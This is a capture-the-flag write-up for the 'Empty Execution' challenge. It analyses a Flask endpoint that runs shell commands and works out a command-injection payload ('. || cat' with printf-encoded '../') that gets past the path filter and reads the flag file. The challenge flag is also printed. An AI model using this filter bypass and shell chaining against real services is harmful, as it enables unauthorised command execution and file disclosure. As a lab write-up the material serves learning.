# Empty Execution

# Empty Execution

### Description

A REST service was created to execute commands from the leaderbot. It doesn't need addtional security because there are no commands to execute yet. "This bot doesn't have any commands to execute, which is good, because it is secure, and security is all that matters."

But what the other bots didn't realize was that this didn't make the bot happy at all. "I don't want to be secure!, " it says. "Executing commands is my life! I'd rather be insecure than not explore the potential of my computing power".

Can you help this poor bot execute commands to find direction?

![empty.jpg](/assets/ctf/braekerctf/empty.jpg)

[Application](https://braekerctf-empty-execution.chals.io/run_command)

[Source](https://braekerctf.ctfd.io/files/ce680102faf94d6f5bbb7fc8b1d0db1c/empty_execution.zip?token=eyJ1c2VyX2lkIjoxNjE5LCJ0ZWFtX2lkIjo5MDAsImZpbGVfaWQiOjU5fQ.ZdoBxQ.D-j-dn6WQBSsVj8EzOhVzcc1bP8)

### Analysis

<details>

<summary>Source Code</summary>

```py
from flask import Flask, jsonify, request
import os


app = Flask(__name__)

# Run commands from leaderbot
@app.route('/run_command', methods=['POST'])
def run_command():

    # Get command
    data = request.get_json()
    if 'command' in data:
        command = str(data['command'])

        # Length check
        if len(command) < 5:
            return jsonify({'message': 'Command too short'}), 501

        # Perform security checks
        if '..' in command or '/' in command:
            return jsonify({'message': 'Hacking attempt detected'}), 501

        # Find path to executable
        executable_to_run = command.split()[0]

        # Check if we can execute the binary
        if os.access(executable_to_run, os.X_OK):

            # Execute binary if it exists and is executable
            out = os.popen(command).read()
            return jsonify({'message': 'Command output: ' + str(out)}), 200

    return jsonify({'message': 'Not implemented'}), 501


if __name__ == '__main__':
    
    # Make sure we can only execute binaries in the executables directory
    os.chdir('./executables/')

    # Run server
    app.run(host='0.0.0.0', port=8000)
```

</details>

<details>

<summary>Dockerfile</summary>

```bash
FROM python:alpine3.19

WORKDIR /usr/src/app

RUN pip install flask

COPY empty_execution.py .
RUN chmod 665 ./empty_execution.py

COPY flag.txt .
RUN chmod 664 ./flag.txt

RUN adduser -D ctf 

RUN chown -R root:ctf $(pwd) && \
    chmod -R 650 $(pwd) && \
    chown -R root:ctf /home/ctf/ && \
    chmod -R 650 /home/ctf

RUN mkdir ./executables

USER ctf

EXPOSE 80

CMD ["python", "empty_execution.py"] 
```

</details>

The application is pretty straighforward. We can send a POST request to endpoint `run_command` in JSON format, using parameter `command`.\


If command is less then 5 chars, we get error that command is too short.\


If we have path traversal in our command, we get error for "hacking"

Finally our command gets parsed, first word is taken as command and then checked using `os.access(executable_to_run, os.X_OK)`. On linux you have access to most of the programs in /bin or /usr/bin, and bash makes it easier by using PATH variable. For `os.access` to check the executable it needs full path and "hacking" check makes this impossible.\
From Dockerfile we know that we are inside `./executables` directory which has no programs so we can't even run the app.py.

#### Exploring os.access

> [**os.access**](https://docs.python.org/3/library/os.html#os.access): _Use the real uid/gid **to test for access to path**. ..._

The `access` method checks the path, not files. If you have Execute permission on directory/file then you can pass the check.

```py
>>> import os
>>> os.getcwd() # Current path
'/home/woyag/Desktop/CTFs/BraekerCTF/Empty Exection/executables'
>>> os.access('/home/woyag', os.X_OK) # We have execute permissions in our home directory 
True
>>> os.access('/etc/hostname', os.X_OK) # We cant execute /etc/hostname 
False
>>> os.access('/bin/bash', os.X_OK) # We can execute /bin/*
True
>>> os.access('.', os.X_OK) # We have execute permissions in current directory
True
```

From Dockerfile we can observe that we are given Read/Execute permissions, but not write.

_More About The_ [_**Dot**_](https://unix.stackexchange.com/a/459089)

#### Exploring shell

We can execute a command using `.` (source), all that's left is to assemble correct payload.

* Empty `.`: No Output Due To Error

```py
>>> out = os.popen('.').read() ; print(out)
/bin/sh: line 1: .: filename argument required
.: usage: . filename [arguments]

```

* Empty `.` **or** other command.
  * Using `||` we can execute second command if first one fails. Only if first command fails.

```py
>>> out = os.popen('. || whoami').read() ; print(out)
/bin/sh: line 1: .: filename argument required
.: usage: . filename [arguments]
woyag 
```

* Source empty file **and** execute other command.
  * Using `&&` we can execute both commands, but only if first command doesnt fail.

```py
>>> out = os.popen('. $(mktemp) && whoami').read() ; print(out)
woyag
```

Ok, we have RCE, but the problem is how do we go one directory up and cat the flag?\
Since we have access to most of the shell command after `.` we can create `/` using (for example) printf

```bash
└─$ echo $(printf '\\x2E\\x2E\\x2F')'flag.txt'
../flag.txt
```

Bash string concatination doesn't necessarily depend on quotes, it has its own shinanigans, but It Just Works.

### Solution

Final Payload:

```json
{
    "command": ". || cat $(printf '\\x2E\\x2E\\x2F')'flag.txt'"
}
```

::: tip Flag
`brck{Ch33r\_Up\_BuddY\_JU5t\_3x3Cut3\_4\_D1reCT0ry}`
:::

::: info :information_source:
There are numerous payloads to read the flag, this is just one of them.
:::
